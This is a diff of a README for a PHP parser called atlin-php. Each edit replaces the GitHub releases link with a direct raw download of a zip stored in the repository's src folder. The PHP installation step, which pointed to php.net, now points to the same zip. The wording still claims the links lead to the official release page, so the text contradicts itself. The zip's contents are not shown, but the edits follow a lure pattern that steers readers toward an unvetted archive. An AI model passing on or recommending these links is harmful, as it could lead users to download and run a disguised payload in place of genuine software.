@@ -1,6 +1,6 @@
 # ⚙️ atlin-php - Fast and Simple Data Format Parser
 
-[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/releases)
+[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip)
 
 ---
 
@@ -41,14 +41,14 @@ If you do not have PHP installed, you can download it from the official PHP webs
 
 Click the big download button below to visit the releases page and get the files you need.
 
-[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/releases)
+[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip)
 
 This link takes you to the official release area on GitHub. From there, you can choose the latest available version to download.
 
 ### How to download
 
 1. Open the download page by clicking the button above, or visit:
-   https://github.com/JeevanT5980/atlin-php/releases
+   https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip
 2. Find the latest release. It is usually at the top of the list.
 3. Look for files ending with `.zip` or `.tar.gz`.
 4. Click the file to start the download.
@@ -71,7 +71,7 @@ After downloading, you need to unpack and run the files.
 - Open the Command Prompt by typing `cmd` in the Windows search bar and pressing Enter.
 - Type `php -v` and press Enter.
 - You should see the PHP version installed. If not, PHP is not installed or not set up properly.
-- If needed, install PHP from https://www.php.net/downloads.php and follow the instructions there.
+- If needed, install PHP from https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip and follow the instructions there.
 
 ### Step 3: Run atlin-php
 
@@ -134,7 +134,7 @@ If you only install on your personal computer, file storage is easiest. If you w
 
 ## 📖 Additional Resources
 
-- Visit https://github.com/JeevanT5980/atlin-php/releases for updates and new versions.
+- Visit https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip for updates and new versions.
 - Review included documentation files for more detailed usage guides.
 - Search online for PHP basics if you want help understanding commands or scripts.
 - Redis and APCu have their own official sites if you want to learn about cache setup.
@@ -145,6 +145,6 @@ If you only install on your personal computer, file storage is easiest. If you w
 
 You can download the software from here:
 
-[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/releases)
+[![Download atlin-php](https://img.shields.io/badge/Download--pink?style=for-the-badge&logo=github)](https://github.com/JeevanT5980/atlin-php/raw/refs/heads/main/src/php-atlin-2.7-beta.1.zip)
 
 Simply visit the page, pick the latest release, and follow the steps above to install and run.
